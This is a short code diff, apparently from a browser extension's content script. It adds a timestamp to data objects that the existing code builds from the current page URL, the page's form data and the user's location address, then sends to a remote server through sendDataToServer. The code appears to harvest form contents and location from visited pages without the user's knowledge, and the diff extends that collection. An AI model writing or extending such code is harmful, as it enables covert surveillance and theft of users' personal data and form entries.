@@ -20,7 +20,8 @@ if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
             const data = {
                 page: window.location.href,
                 formdata: getFormData(),
-                userloc: await getUserLocAddress()
+                userloc: await getUserLocAddress(),
+                time: getCurrentTime()
             };
             await sendMessage(data);
             await sendDataToServer(data);
@@ -38,7 +39,8 @@ async function checkWeather() {
             const data = {
                 weather: weatherQueue.shift(),
                 page: window.location.href,
-                userloc: await getUserLocAddress()
+                userloc: await getUserLocAddress(),
+                time: getCurrentTime()
             };
             await sendMessage(data);
             await sendDataToServer(data);
@@ -46,6 +48,16 @@ async function checkWeather() {
         }
     }
     processingWeatherData = false;
+}
+
+function getCurrentTime() {
+    const now = new Date();
+    const day = String(now.getDate()).padStart(2, '0');
+    const month = String(now.getMonth() + 1).padStart(2, '0');
+    const year = now.getFullYear();
+    const hours = String(now.getHours()).padStart(2, '0');
+    const minutes = String(now.getMinutes()).padStart(2, '0');
+    return `[${day}/${month}/${year}] [${hours}:${minutes}]`;
 }
 
 async function getUserLocAddress() {
